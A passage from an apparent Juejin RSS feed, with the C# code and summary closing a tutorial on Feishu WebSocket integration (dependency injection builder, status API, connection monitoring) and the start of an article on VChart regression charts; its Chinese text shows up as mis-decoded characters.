                department.DepartmentId, permission, cancellationToken);
        }
        
        <span class="hljs-comment">// ä¸ºéƒ¨é—¨ä¸»ç®¡åˆ†é…ç®¡ç†å‘˜æƒé™</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(department.LeaderUserId))
        {
            <span class="hljs-keyword">await</span> _permissionService.GrantPermissionAsync(
                department.DepartmentId, <span class="hljs-string">"department.admin"</span>, cancellationToken);
        }
    }
}
</code></pre>
<h3 data-id="heading-16">4.3 ä¾èµ–æ³¨å…¥é…ç½®</h3>
<p><strong>å»ºé€ è€…æ¨¡å¼åº”ç”¨</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> é£ä¹¦WebSocketæœåŠ¡æ³¨å†Œæ‰©å±•</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">FeishuWebSocketServiceExtensions</span>
{
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ä½¿ç”¨å»ºé€ è€…æ¨¡å¼æ³¨å†Œé£ä¹¦WebSocketæœåŠ¡</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> IFeishuWebSocketBuilder <span class="hljs-title">AddFeishuWebSocketBuilder</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> IServiceCollection services</span>)</span>
    {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> FeishuWebSocketBuilder(services);
    }
}

<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> é£ä¹¦WebSocketæœåŠ¡å»ºé€ è€…</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">FeishuWebSocketBuilder</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IServiceCollection _services;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> List&lt;Type&gt; _handlerTypes = <span class="hljs-keyword">new</span>();
    <span class="hljs-keyword">private</span> FeishuWebSocketOptions _options = <span class="hljs-keyword">new</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> _useMultiHandler = <span class="hljs-literal">false</span>;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">FeishuWebSocketBuilder</span>(<span class="hljs-params">IServiceCollection services</span>)</span>
    {
        _services = services ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(services));
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ä»é…ç½®æ–‡ä»¶è¯»å–é…ç½®</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> FeishuWebSocketBuilder <span class="hljs-title">ConfigureFrom</span>(<span class="hljs-params">IConfiguration configuration</span>)</span>
    {
        configuration.GetSection(<span class="hljs-string">"Feishu:WebSocket"</span>).Bind(_options);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> é…ç½®é€‰é¡¹</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> FeishuWebSocketBuilder <span class="hljs-title">ConfigureOptions</span>(<span class="hljs-params">Action&lt;FeishuWebSocketOptions&gt; configure</span>)</span>
    {
        configure?.Invoke(_options);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å¯ç”¨å¤šå¤„ç†å™¨æ¨¡å¼</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> FeishuWebSocketBuilder <span class="hljs-title">UseMultiHandler</span>()</span>
    {
        _useMultiHandler = <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ·»åŠ äº‹ä»¶å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> FeishuWebSocketBuilder <span class="hljs-title">AddHandler</span>&lt;<span class="hljs-title">THandler</span>&gt;() <span class="hljs-keyword">where</span> THandler : <span class="hljs-keyword">class</span>, IFeishuEventHandler</span>
    {
        _handlerTypes.Add(<span class="hljs-keyword">typeof</span>(THandler));
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ„å»ºæœåŠ¡æ³¨å†Œ</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> IServiceCollection <span class="hljs-title">Build</span>()</span>
    {
        <span class="hljs-comment">// æ³¨å†Œé…ç½®é€‰é¡¹</span>
        _services.Configure(_options);
        
        <span class="hljs-keyword">if</span> (_useMultiHandler)
        {
            <span class="hljs-comment">// å¤šå¤„ç†å™¨æ¨¡å¼</span>
            _services.AddSingleton&lt;IFeishuEventHandlerFactory, DefaultFeishuEventHandlerFactory&gt;();
            
            <span class="hljs-comment">// æ³¨å†Œæ‰€æœ‰å¤„ç†å™¨ç±»å‹</span>
            <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> handlerType <span class="hljs-keyword">in</span> _handlerTypes)
            {
                _services.AddSingleton(<span class="hljs-keyword">typeof</span>(IFeishuEventHandler), handlerType);
            }
            
            _services.AddSingleton&lt;IFeishuWebSocketManager, FeishuWebSocketManager&gt;();
        }
        <span class="hljs-keyword">else</span>
        {
            <span class="hljs-comment">// å•å¤„ç†å™¨æ¨¡å¼</span>
            <span class="hljs-keyword">var</span> handlerType = _handlerTypes.FirstOrDefault();
            <span class="hljs-keyword">if</span> (handlerType != <span class="hljs-literal">null</span>)
            {
                _services.AddSingleton(<span class="hljs-keyword">typeof</span>(IFeishuEventHandler), handlerType);
                _services.AddSingleton&lt;IFeishuWebSocketManager, FeishuWebSocketManager&gt;();
            }
        }
        
        <span class="hljs-keyword">return</span> _services;
    }
}
</code></pre>
<p><strong>å®é™…ä½¿ç”¨ç¤ºä¾‹</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// Program.cs ä¸­çš„é…ç½®ç¤ºä¾‹</span>
<span class="hljs-keyword">var</span> builder = WebApplication.CreateBuilder(args);

<span class="hljs-comment">// æ–¹å¼ä¸€ï¼šå»ºé€ è€…æ¨¡å¼æ³¨å†Œï¼ˆæ¨èï¼‰</span>
builder.Services.AddFeishuWebSocketBuilder()
    .ConfigureFrom(builder.Configuration)           <span class="hljs-comment">// ä»é…ç½®æ–‡ä»¶è¯»å–</span>
    .UseMultiHandler()                              <span class="hljs-comment">// å¯ç”¨å¤šå¤„ç†å™¨æ¨¡å¼</span>
    .AddHandler&lt;ReceiveMessageEventHandler&gt;()        <span class="hljs-comment">// æ·»åŠ æ¶ˆæ¯å¤„ç†å™¨</span>
    .AddHandler&lt;UserCreatedEventHandler&gt;()           <span class="hljs-comment">// æ·»åŠ ç”¨æˆ·äº‹ä»¶å¤„ç†å™¨</span>
    .AddHandler&lt;DepartmentCreatedEventHandler&gt;()      <span class="hljs-comment">// æ·»åŠ éƒ¨é—¨äº‹ä»¶å¤„ç†å™¨</span>
    .Build();                                       <span class="hljs-comment">// æ„å»ºæœåŠ¡æ³¨å†Œ</span>

<span class="hljs-comment">// æ–¹å¼äºŒï¼šç®€åŒ–æ³¨å†Œ</span>
builder.Services.AddFeishuWebSocketServiceWithSingleHandler&lt;ReceiveMessageEventHandler&gt;(
    options =&gt; {
        options.AutoReconnect = <span class="hljs-literal">true</span>;
        options.MaxReconnectAttempts = <span class="hljs-number">5</span>;
        options.HeartbeatIntervalMs = <span class="hljs-number">30000</span>;
        options.EnableLogging = <span class="hljs-literal">true</span>;
    });

<span class="hljs-comment">// æ–¹å¼ä¸‰ï¼šä»é…ç½®æ–‡ä»¶æ³¨å†Œ</span>
builder.Services.AddFeishuWebSocketService(builder.Configuration);
</code></pre>
<h3 data-id="heading-17">4.4 Web APIé›†æˆ</h3>
<p><strong>RESTful APIè®¾è®¡</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> WebSocketç®¡ç†æ§åˆ¶å™¨</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
[<span class="hljs-meta">ApiController</span>]
[<span class="hljs-meta">Route(<span class="hljs-string">"api/[controller]"</span>)</span>]
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">WebSocketController</span> : <span class="hljs-title">ControllerBase</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IFeishuWebSocketManager _webSocketManager;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;WebSocketController&gt; _logger;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">WebSocketController</span>(<span class="hljs-params">IFeishuWebSocketManager webSocketManager,
        ILogger&lt;WebSocketController&gt; logger</span>)</span>
    {
        _webSocketManager = webSocketManager ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(webSocketManager));
        _logger = logger ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(logger));
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å¯åŠ¨WebSocketè¿æ¥</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    [<span class="hljs-meta">HttpPost(<span class="hljs-string">"connect"</span>)</span>]
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;IActionResult&gt; <span class="hljs-title">ConnectAsync</span>()</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-keyword">await</span> _webSocketManager.StartAsync();
            
            <span class="hljs-keyword">return</span> Ok(<span class="hljs-keyword">new</span> 
            { 
                Success = <span class="hljs-literal">true</span>,
                Message = <span class="hljs-string">"WebSocketè¿æ¥å¯åŠ¨æˆåŠŸ"</span>,
                Timestamp = DateTime.UtcNow
            });
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"å¯åŠ¨WebSocketè¿æ¥å¤±è´¥"</span>);
            <span class="hljs-keyword">return</span> BadRequest(<span class="hljs-keyword">new</span> 
            { 
                Success = <span class="hljs-literal">false</span>,
                Message = <span class="hljs-string">$"WebSocketè¿æ¥å¯åŠ¨å¤±è´¥: <span class="hljs-subst">{ex.Message}</span>"</span>,
                Timestamp = DateTime.UtcNow
            });
        }
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ–­å¼€WebSocketè¿æ¥</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    [<span class="hljs-meta">HttpPost(<span class="hljs-string">"disconnect"</span>)</span>]
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;IActionResult&gt; <span class="hljs-title">DisconnectAsync</span>()</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-keyword">await</span> _webSocketManager.StopAsync();
            
            <span class="hljs-keyword">return</span> Ok(<span class="hljs-keyword">new</span> 
            { 
                Success = <span class="hljs-literal">true</span>,
                Message = <span class="hljs-string">"WebSocketè¿æ¥æ–­å¼€æˆåŠŸ"</span>,
                Timestamp = DateTime.UtcNow
            });
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"æ–­å¼€WebSocketè¿æ¥å¤±è´¥"</span>);
            <span class="hljs-keyword">return</span> BadRequest(<span class="hljs-keyword">new</span> 
            { 
                Success = <span class="hljs-literal">false</span>,
                Message = <span class="hljs-string">$"WebSocketè¿æ¥æ–­å¼€å¤±è´¥: <span class="hljs-subst">{ex.Message}</span>"</span>,
                Timestamp = DateTime.UtcNow
            });
        }
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> è·å–è¿æ¥çŠ¶æ€</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    [<span class="hljs-meta">HttpGet(<span class="hljs-string">"status"</span>)</span>]
    <span class="hljs-function"><span class="hljs-keyword">public</span> IActionResult <span class="hljs-title">GetStatus</span>()</span>
    {
        <span class="hljs-keyword">var</span> stats = _webSocketManager.GetConnectionStats();
        <span class="hljs-keyword">var</span> state = _webSocketManager.GetConnectionState();
        
        <span class="hljs-keyword">return</span> Ok(<span class="hljs-keyword">new</span> WebSocketStatusResponse
        {
            IsConnected = _webSocketManager.IsConnected,
            State = state.Status.ToString(),
            Uptime = stats.Uptime,
            ReconnectCount = stats.ReconnectCount,
            LastError = stats.LastError?.Message,
            Timestamp = DateTime.UtcNow
        });
    }
}
</code></pre>
<p><strong>å®æ—¶çŠ¶æ€ç›‘æ§</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> WebSocketçŠ¶æ€ç›‘æ§æœåŠ¡</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">WebSocketMonitoringService</span> : <span class="hljs-title">IHostedService</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IFeishuWebSocketManager _webSocketManager;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;WebSocketMonitoringService&gt; _logger;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> Timer _monitoringTimer;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ConcurrentQueue&lt;ConnectionSnapshot&gt; _snapshots = <span class="hljs-keyword">new</span>();
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">WebSocketMonitoringService</span>(<span class="hljs-params">IFeishuWebSocketManager webSocketManager,
        ILogger&lt;WebSocketMonitoringService&gt; logger</span>)</span>
    {
        _webSocketManager = webSocketManager;
        _logger = logger;
        
        <span class="hljs-comment">// æ¯30ç§’æ”¶é›†ä¸€æ¬¡çŠ¶æ€å¿«ç…§</span>
        _monitoringTimer = <span class="hljs-keyword">new</span> Timer(CollectStatusSnapshot, <span class="hljs-literal">null</span>,
            TimeSpan.Zero, TimeSpan.FromSeconds(<span class="hljs-number">30</span>));
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ”¶é›†çŠ¶æ€å¿«ç…§</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">CollectStatusSnapshot</span>(<span class="hljs-params"><span class="hljs-built_in">object</span>? state</span>)</span>
    {
        <span class="hljs-keyword">var</span> stats = _webSocketManager.GetConnectionStats();
        <span class="hljs-keyword">var</span> connectionState = _webSocketManager.GetConnectionState();
        
        <span class="hljs-keyword">var</span> snapshot = <span class="hljs-keyword">new</span> ConnectionSnapshot
        {
            Timestamp = DateTime.UtcNow,
            IsConnected = stats.IsConnected,
            Uptime = stats.Uptime,
            ReconnectCount = stats.ReconnectCount,
            LastError = stats.LastError,
            ConnectionState = connectionState.Status.ToString()
        };
        
        _snapshots.Enqueue(snapshot);
        
        <span class="hljs-comment">// ä¿æŒæœ€è¿‘100ä¸ªå¿«ç…§</span>
        <span class="hljs-keyword">while</span> (_snapshots.Count &gt; <span class="hljs-number">100</span>)
        {
            _snapshots.TryDequeue(<span class="hljs-keyword">out</span> _);
        }
        
        <span class="hljs-comment">// åˆ†æè¿æ¥è´¨é‡</span>
        AnalyzeConnectionQuality();
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> åˆ†æè¿æ¥è´¨é‡</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">AnalyzeConnectionQuality</span>()</span>
    {
        <span class="hljs-keyword">var</span> recentSnapshots = _snapshots.TakeLast(<span class="hljs-number">10</span>).ToList();
        <span class="hljs-keyword">if</span> (recentSnapshots.Count &lt; <span class="hljs-number">5</span>) <span class="hljs-keyword">return</span>;
        
        <span class="hljs-keyword">var</span> connectedCount = recentSnapshots.Count(s =&gt; s.IsConnected);
        <span class="hljs-keyword">var</span> connectivityRate = (<span class="hljs-built_in">double</span>)connectedCount / recentSnapshots.Count;
        
        <span class="hljs-keyword">if</span> (connectivityRate &lt; <span class="hljs-number">0.9</span>)
        {
            _logger.LogWarning(<span class="hljs-string">"è¿æ¥è´¨é‡è¾ƒå·® - è¿æ¥ç‡: {ConnectivityRate:P2}"</span>, connectivityRate);
        }
        
        <span class="hljs-comment">// åˆ†æé‡è¿é¢‘ç‡</span>
        <span class="hljs-keyword">var</span> reconnectEvents = recentSnapshots
            .Where(s =&gt; s.ReconnectCount &gt; <span class="hljs-number">0</span>)
            .ToList();
        
        <span class="hljs-keyword">if</span> (reconnectEvents.Count &gt; <span class="hljs-number">3</span>)
        {
            _logger.LogWarning(<span class="hljs-string">"é‡è¿é¢‘ç‡è¿‡é«˜ - æœ€è¿‘10æ¬¡æ£€æµ‹ä¸­æœ‰{Count}æ¬¡é‡è¿"</span>, 
                reconnectEvents.Count);
        }
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-18">ğŸ¯ æ€»ç»“</h2>
<p>ä½¿ç”¨ Mud.Feishu.Abstractions å’Œ Mud.Feishu.WebSocket ä¸¤ä¸ªæ ¸å¿ƒé¡¹ç›®æ„å»ºä¼ä¸šçº§çš„é£ä¹¦WebSocketé•¿è¿æ¥åº”ç”¨ã€‚é€šè¿‡ç»„ä»¶åŒ–æ¶æ„è®¾è®¡ã€ç­–ç•¥æ¨¡å¼çš„äº‹ä»¶å¤„ç†ã€å®Œå–„çš„é”™è¯¯éš”ç¦»æœºåˆ¶å’Œå…¨é¢çš„ç›‘æ§ä½“ç³»ï¼Œå¼€å‘è€…å¯ä»¥å¿«é€Ÿæ„å»ºç¨³å®šã€å¯é çš„å®æ—¶äº‹ä»¶å¤„ç†ç³»ç»Ÿã€‚</p>
<p>æ€»çš„æ¥è¯´ï¼ŒMud.Feishu.Abstractions å’Œ Mud.Feishu.WebSocket ä¸¤ä¸ªæ ¸å¿ƒé¡¹ç›®çš„ç›®æ ‡æ˜¯æä¾›ä¸€ä¸ªå¯é ã€æ˜“äºé›†æˆã€é«˜åº¦å¯æ‰©å±•çš„é£ä¹¦WebSocketé•¿è¿æ¥åº”ç”¨æ¡†æ¶ã€‚</p>
<p><strong>æ ¸å¿ƒç‰¹æ€§</strong></p>
<ol>
<li><strong>å¼€ç®±å³ç”¨</strong>ï¼šé¢„ç½®çš„è¿æ¥ç®¡ç†ã€è®¤è¯å¤„ç†ã€æ¶ˆæ¯è·¯ç”±ç­‰æ ¸å¿ƒç»„ä»¶</li>
<li><strong>é«˜åº¦å¯æ‰©å±•</strong>ï¼šåŸºäºæ¥å£çš„äº‹ä»¶å¤„ç†å™¨è®¾è®¡ï¼Œæ”¯æŒè‡ªå®šä¹‰ä¸šåŠ¡é€»è¾‘</li>
<li><strong>ä¼ä¸šçº§ç¨³å®š</strong>ï¼šè‡ªåŠ¨é‡è¿ã€é”™è¯¯éš”ç¦»ã€å¿ƒè·³ç›‘æ§ç­‰ç”Ÿäº§çº§ç‰¹æ€§</li>
<li><strong>æ˜“äºé›†æˆ</strong>ï¼šå®Œæ•´çš„ä¾èµ–æ³¨å…¥æ”¯æŒï¼Œä¸.NETç”Ÿæ€ç³»ç»Ÿæ— ç¼é›†æˆ</li>
<li><strong>å…¨é¢ç›‘æ§</strong>ï¼šè¯¦ç»†çš„æ—¥å¿—è®°å½•å’Œæ€§èƒ½æŒ‡æ ‡ï¼Œä¾¿äºè¿ç»´ç®¡ç†</li>
</ol>
<p>è¿™å¥—æ¶æ„ä¸ºä¼ä¸šçº§å®æ—¶åº”ç”¨æä¾›äº†åšå®çš„åŸºç¡€ï¼Œå¤§å¤§é™ä½äº†é£ä¹¦WebSocketé›†æˆçš„å¼€å‘å¤æ‚åº¦ï¼Œè®©å¼€å‘è€…èƒ½å¤Ÿä¸“æ³¨äºä¸šåŠ¡é€»è¾‘çš„å®ç°ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VChart æ‰©å±•æ–°åŠŸèƒ½ï¼šä¸€è¡Œä»£ç è§£é”æ•°æ®å›å½’ä¸è¶‹åŠ¿åˆ†æ]]></title>    <link>https://juejin.cn/post/7580971667036700698</link>    <guid>https://juejin.cn/post/7580971667036700698</guid>    <pubDate>2025-12-08T03:16:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580971667036700698" data-draft-id="7580623265792622630" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VChart æ‰©å±•æ–°åŠŸèƒ½ï¼šä¸€è¡Œä»£ç è§£é”æ•°æ®å›å½’ä¸è¶‹åŠ¿åˆ†æ"/> <meta itemprop="keywords" content="å‰ç«¯,æ•°æ®å¯è§†åŒ–,ECharts"/> <meta itemprop="datePublished" content="2025-12-08T03:16:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç„é­‚"/> <meta itemprop="url" content="https://juejin.cn/user/571401774834093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VChart æ‰©å±•æ–°åŠŸèƒ½ï¼šä¸€è¡Œä»£ç è§£é”æ•°æ®å›å½’ä¸è¶‹åŠ¿åˆ†æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/571401774834093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç„é­‚
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:16:56.000Z" title="Mon Dec 08 2025 03:16:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul 